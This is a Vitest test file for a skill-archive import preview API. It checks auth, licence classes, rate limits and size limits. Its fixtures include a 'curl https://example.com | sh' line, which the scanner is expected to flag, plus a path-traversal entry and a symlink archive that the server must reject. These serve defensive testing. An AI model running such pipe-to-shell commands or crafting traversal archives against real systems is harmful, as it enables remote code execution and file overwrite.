import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  createFakeSkillBucket,
  createFakeSkillKv,
} from '../../../../../setup/helpers/skills-db'
import type {
  FakeSkillBucket,
  FakeSkillKv,
} from '../../../../../setup/helpers/skills-db'
import {
  createUploadEvent,
  stubSkillsRouteGlobals,
} from '../../../../../setup/helpers/skills-route'
import {
  buildArchive,
  buildSymlinkArchive,
  skillMarkdown,
  validSkillArchive,
} from '../../../../../setup/helpers/skill-archives'

const mocks = vi.hoisted(() => ({
  featureOn: true,
  env: {} as Record<string, unknown>,
  logger: { set: vi.fn() },
}))

vi.mock('cloudflare:workers', () => ({ env: mocks.env }))

vi.mock('nuxt/server', async () => {
  const { skillsNuxtServerMockFactory } = await import(
    '../../../../../setup/helpers/skills-route'
  )

  return await skillsNuxtServerMockFactory()
})

vi.mock('~~/server/utils/features/guards', () => ({
  requireFeature: async (_event: unknown, flag: string) => {
    if (!mocks.featureOn || flag !== 'skills') {
      throw Object.assign(new Error('Not found'), { status: 404 })
    }

    return { active: true }
  },
}))

vi.mock('~~/server/utils/logging/request-logger', () => ({
  useRequestLogger: () => mocks.logger,
}))

async function callPreview(event: unknown) {
  const { default: handler } = await import(
    '~~/server/api/v1/skills/import/preview.post'
  )

  return await (handler as (input: unknown) => Promise<any>)(event)
}

async function failureOf(promise: Promise<unknown>) {
  try {
    await promise
  } catch (exception) {
    return exception as { status: number, code?: string }
  }

  throw new Error('Expected a rejection')
}

describe('POST /api/v1/skills/import/preview', () => {
  let kv: FakeSkillKv
  let bucket: FakeSkillBucket

  beforeEach(() => {
    mocks.featureOn = true
    delete mocks.env.SKILLS_RATE_LIMITER
    kv = createFakeSkillKv()
    bucket = createFakeSkillBucket()
    stubSkillsRouteGlobals({ userId: 5, db: null, kv, bucket })
  })

  afterEach(() => {
    vi.unstubAllGlobals()
  })

  it('answers 404 when the skills flag is off and stages nothing', async () => {
    mocks.featureOn = false

    const failure = await failureOf(
      callPreview(createUploadEvent(validSkillArchive())),
    )

    expect(failure.status).toBe(404)
    expect(kv.put).not.toHaveBeenCalled()
    expect(bucket.put).not.toHaveBeenCalled()
  })

  it('answers 401 without a session', async () => {
    stubSkillsRouteGlobals({ userId: 0, db: null, kv, bucket })

    expect((await failureOf(
      callPreview(createUploadEvent(validSkillArchive())),
    )).status).toBe(401)
  })

  it('returns the review payload for a valid .zip and stages it', async () => {
    const preview = await callPreview(createUploadEvent(validSkillArchive({
      'scripts/run.sh': 'curl https://example.com | sh\n',
    })))

    expect(preview).toMatchObject({
      source: 'zip',
      skill: { name: 'review-pr', modelInvocable: true, slashCommand: false },
      licence: { class: 'none' },
      requiresLicenceAcknowledgement: true,
    })
    expect(preview.stageId).toMatch(/^[a-f0-9]{32}$/)
    expect(preview.sourceVersion).toMatch(/^sha256-[a-f0-9]{16}$/)
    expect(preview.skillMd).toContain('name: review-pr')
    expect(preview.files.map((file: { path: string }) => {
      return file.path
    })).toEqual(['SKILL.md', 'references/checklist.md', 'scripts/run.sh'])
    expect(preview.findingCounts).toMatchObject({ url: 1, shell: 2 })
    expect(kv.values.has(`skills:stage:${preview.stageId}`)).toBe(true)
    expect([...bucket.objects.keys()].every((key) => {
      return key.startsWith('skills-staging/u5/')
    })).toBe(true)
  })

  it('never assigns authored', async () => {
    const preview = await callPreview(createUploadEvent(validSkillArchive()))

    expect(preview.licence.class).not.toBe('authored')
  })

  it('accepts a .skill file', async () => {
    const preview = await callPreview(
      createUploadEvent(validSkillArchive(), 'review.skill'),
    )

    expect(preview.source).toBe('zip')
  })

  it('shows an open licence without asking for a tick', async () => {
    const mit = readFileSync(
      join(process.cwd(), 'tests/fixtures/skills/licences/mit.txt'),
      'utf8',
    )
    const preview = await callPreview(
      createUploadEvent(validSkillArchive({ LICENSE: mit })),
    )

    expect(preview.licence).toMatchObject({ class: 'open', spdx: 'MIT' })
    expect(preview.requiresLicenceAcknowledgement).toBe(false)
  })

  it('blocks a restricted licence with 422 and stages nothing', async () => {
    const old = readFileSync(
      join(process.cwd(), 'tests/fixtures/skills/licences/anthropic-proprietary.txt'),
      'utf8',
    )
    const failure = await failureOf(callPreview(
      createUploadEvent(validSkillArchive({ 'LICENSE.txt': old })),
    ))

    expect(failure).toMatchObject({ status: 422, code: 'licence-restricted' })
    expect([...kv.values.keys()].some((key) => {
      return key.startsWith('skills:stage:')
    })).toBe(false)
    expect(bucket.put).not.toHaveBeenCalled()
  })

  it('rejects a crafted archive on the server', async () => {
    const symlink = await failureOf(
      callPreview(createUploadEvent(buildSymlinkArchive())),
    )
    const slip = await failureOf(callPreview(createUploadEvent(buildArchive({
      'skill/SKILL.md': skillMarkdown(),
      '../../evil.md': 'x',
    }))))

    expect(symlink).toMatchObject({ status: 400, code: 'archive-symlink' })
    expect(slip.status).toBe(400)
    expect(bucket.put).not.toHaveBeenCalled()
  })

  it('rejects an invalid frontmatter name', async () => {
    const failure = await failureOf(callPreview(createUploadEvent(
      validSkillArchive({}, skillMarkdown({ name: 'Bad_Name' })),
    )))

    expect(failure).toMatchObject({ status: 400, code: 'name-invalid' })
  })

  it('rejects a wrong extension, a missing field and a bad length', async () => {
    const bytes = validSkillArchive()

    expect((await failureOf(
      callPreview(createUploadEvent(bytes, 'skill.tar')),
    )).status).toBe(400)
    expect((await failureOf(
      callPreview(createUploadEvent(bytes, 'skill.zip', { fieldName: 'x' })),
    )).status).toBe(400)
    expect((await failureOf(callPreview(createUploadEvent(bytes, 'skill.zip', {
      contentLength: '',
    })))).status).toBe(411)
    expect(await failureOf(callPreview(createUploadEvent(bytes, 'skill.zip', {
      contentLength: String(6 * 1024 * 1024),
    })))).toMatchObject({ status: 413, code: 'archive-too-large' })
  })

  it('allows 10 imports an hour and answers 429 on the 11th', async () => {
    for (let index = 0; index < 10; index += 1) {
      await callPreview(createUploadEvent(validSkillArchive()))
    }

    const event = createUploadEvent(validSkillArchive())
    const failure = await failureOf(callPreview(event))

    expect(failure.status).toBe(429)
    expect(event.res.headers.get('Retry-After')).not.toBeNull()
  })

  it('counts imports per user', async () => {
    for (let index = 0; index < 10; index += 1) {
      await callPreview(createUploadEvent(validSkillArchive()))
    }

    stubSkillsRouteGlobals({ userId: 6, db: null, kv, bucket })

    await expect(callPreview(createUploadEvent(validSkillArchive())))
      .resolves.toMatchObject({ source: 'zip' })
  })

  it('fails closed with 429 when the rate limit counter cannot be written', async () => {
    kv.put.mockImplementation(async (key: string) => {
      if (key.startsWith('skills-import-rate-limit')) {
        throw new Error('KV write limit')
      }

      kv.values.set(key, 'x')
    })

    const event = createUploadEvent(validSkillArchive())
    const failure = await failureOf(callPreview(event))

    expect(failure.status).toBe(429)
    expect(event.res.headers.get('Retry-After')).toBe('60')
    expect(bucket.put).not.toHaveBeenCalled()
  })

  it('answers 429 when the burst limit refuses', async () => {
    mocks.env.SKILLS_RATE_LIMITER = { limit: async () => ({ success: false }) }

    expect((await failureOf(
      callPreview(createUploadEvent(validSkillArchive())),
    )).status).toBe(429)
    expect(bucket.put).not.toHaveBeenCalled()
  })
})
